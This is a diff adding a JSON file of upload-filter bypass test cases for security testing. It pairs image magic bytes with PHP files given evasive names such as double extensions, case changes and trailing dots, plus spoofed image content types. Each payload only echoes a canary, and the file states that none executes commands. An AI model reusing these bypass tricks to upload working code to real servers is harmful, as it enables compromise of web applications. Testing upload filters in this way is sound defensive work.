@@ -1,0 +1,16 @@
+{
+  "_meta": {
+    "description": "Benign canary polyglots for upload-filter bypass testing. Each carries a harmless PHP that only echoes a per-run canary -- it proves the filter was bypassed AND (if the canary renders) that the file executed, WITHOUT being a webshell. There is NO command execution, eval, file write, or network code in any payload. Magic bytes make the file pass image content-type/magic checks.",
+    "safety": "no system()/exec()/eval()/passthru()/shell_exec/webshell payloads; content is <?php echo '<canary>'; ?> only",
+    "sources": ["https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/File-Upload (technique reference)"],
+    "version": "1.0"
+  },
+  "polyglots": [
+    {"name": "gif89a_php",     "magic_hex": "474946383961",             "filename": "avatar.php",     "content_type": "image/gif",  "template": "<?php echo '{CANARY}'; ?>"},
+    {"name": "jpeg_phtml",     "magic_hex": "ffd8ffe000104a4649460001", "filename": "picture.phtml",  "content_type": "image/jpeg", "template": "<?php echo '{CANARY}'; ?>"},
+    {"name": "png_double_ext", "magic_hex": "89504e470d0a1a0a",         "filename": "logo.php.png",   "content_type": "image/png",  "template": "<?php echo '{CANARY}'; ?>"},
+    {"name": "plain_phtml",    "magic_hex": "",                         "filename": "note.phtml",     "content_type": "text/plain", "template": "<?php echo '{CANARY}'; ?>"},
+    {"name": "case_bypass",    "magic_hex": "474946383961",             "filename": "image.pHp",      "content_type": "image/gif",  "template": "<?php echo '{CANARY}'; ?>"},
+    {"name": "trailing_dot",   "magic_hex": "474946383961",             "filename": "file.php.",      "content_type": "image/gif",  "template": "<?php echo '{CANARY}'; ?>"}
+  ]
+}
